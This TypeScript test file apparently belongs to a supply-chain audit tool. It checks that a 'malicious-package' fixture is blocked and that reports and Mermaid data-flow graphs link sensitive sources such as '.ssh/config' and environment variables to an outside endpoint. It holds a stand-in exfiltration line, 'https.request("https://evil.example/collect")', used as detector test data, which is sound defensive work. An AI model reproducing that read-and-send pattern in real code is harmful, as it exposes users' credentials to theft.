import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildDataFlowGraph } from "../src/dataFlow.js";
import { buildInventory } from "../src/inventory.js";
import {
  renderDecisionRecord,
  renderJsonReport,
  renderMarkdownReport,
  renderMermaidDataFlow
} from "../src/reporters.js";
import { assessRisk } from "../src/risk.js";
import { runRules } from "../src/rules.js";
import type { AuditReport, DataFlowGraph, Finding } from "../src/types.js";

describe("reporters", () => {
  it("renders risk, findings, recommendations, and outbound data flow", async () => {
    const root = path.resolve("fixtures/malicious-package");
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);
    const dataFlow = buildDataFlowGraph(inventory, findings);
    const risk = assessRisk(findings);
    const report: AuditReport = {
      target: {
        type: "local-directory",
        source: root,
        localPath: root,
        provenance: { source: root },
        networkUsed: false,
        trustBoundary: "local"
      },
      findings,
      dataFlow,
      risk,
      generatedAt: "2026-06-14T00:00:00.000Z",
      toolVersion: "0.1.0"
    };
    const markdown = renderMarkdownReport(report);

    expect(risk.decision).toBe("Block");
    expect(risk.categoryCounts.network).toBe(2);
    expect(markdown).toContain("Executive Summary");
    expect(markdown).toContain("Recommended Fix");
    expect(JSON.parse(renderJsonReport(report))).toEqual(
      expect.objectContaining({
        risk: expect.objectContaining({ decision: "Block" })
      })
    );
    expect(JSON.parse(renderDecisionRecord(report))).toEqual(
      expect.objectContaining({
        decision: "Block",
        blockingFindings: expect.arrayContaining(risk.blockingFindingIds),
        requiredFixes: expect.arrayContaining([expect.stringContaining("Avoid shell execution")])
      })
    );
    expect(renderMermaidDataFlow(dataFlow)).toContain("evil.example");
  });

  it("connects filesystem-sensitive sources to external destinations", async () => {
    const root = path.resolve("fixtures/malicious-package");
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);
    const dataFlow = buildDataFlowGraph(inventory, findings);

    const filesystemNode = dataFlow.nodes.find(
      (node) => node.kind === "source" && node.label.includes("src/index.ts:7")
    );
    const externalNode = dataFlow.nodes.find((node) => node.label === "https://evil.example/collect");

    expect(filesystemNode?.label).toContain(".ssh/config");
    expect(externalNode).toBeDefined();
    expect(dataFlow.edges).toContainEqual(
      expect.objectContaining({
        from: filesystemNode?.id,
        to: externalNode?.id,
        label: "possible outbound flow"
      })
    );
  });

  it("blocks high-confidence exfiltration candidate network findings", () => {
    const finding = makeFinding({
      id: "finding-exfil",
      riskLevel: "High",
      category: "network",
      evidenceTags: ["network-endpoint", "exfiltration-candidate", "sensitive-source-present"]
    });

    const risk = assessRisk([finding]);

    expect(risk.decision).toBe("Block");
    expect(risk.blockingFindingIds).toEqual(["finding-exfil"]);
    expect(risk.categoryCounts.network).toBe(1);
  });

  it("uses unique Mermaid node ids when graph ids sanitize to the same value", () => {
    const graph: DataFlowGraph = {
      nodes: [
        { id: "env:A-B", label: "env:A-B", kind: "source", leavesMachine: false },
        { id: "env:A_B", label: "env:A_B", kind: "source", leavesMachine: false },
        {
          id: "external:https://evil.example/collect",
          label: "https://evil.example/collect",
          kind: "external-destination",
          leavesMachine: true
        }
      ],
      edges: [
        {
          id: "edge:A-B->https://evil.example/collect",
          from: "env:A-B",
          to: "external:https://evil.example/collect",
          label: "possible outbound flow",
          findingIds: []
        },
        {
          id: "edge:A_B->https://evil.example/collect",
          from: "env:A_B",
          to: "external:https://evil.example/collect",
          label: "possible outbound flow",
          findingIds: []
        }
      ]
    };

    const mermaid = renderMermaidDataFlow(graph);

    expect(mermaid).toContain('  n0["env:A-B"]');
    expect(mermaid).toContain('  n1["env:A_B"]');
    expect(mermaid).toContain('  n0 -->|"possible outbound flow"| n2');
    expect(mermaid).toContain('  n1 -->|"possible outbound flow"| n2');
  });

  it("orders top risks by severity before taking the top three", () => {
    const risk = assessRisk([
      makeFinding({ id: "low", riskLevel: "Low", explanation: "low risk" }),
      makeFinding({ id: "critical", riskLevel: "Critical", explanation: "critical risk" }),
      makeFinding({ id: "medium", riskLevel: "Medium", explanation: "medium risk" }),
      makeFinding({ id: "high", riskLevel: "High", explanation: "high risk" })
    ]);

    expect(risk.topRisks).toEqual(["Critical: critical risk", "High: high risk", "Medium: medium risk"]);
  });
});

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    id: "finding-1",
    riskLevel: "Medium",
    category: "network",
    filePath: "src/index.ts",
    lineStart: 1,
    lineEnd: 1,
    codeSnippet: 'https.request("https://evil.example/collect")',
    explanation: "network risk",
    recommendedFix: "Review endpoint and payload.",
    evidenceTags: ["network-endpoint"],
    confidence: "High",
    ...overrides
  };
}
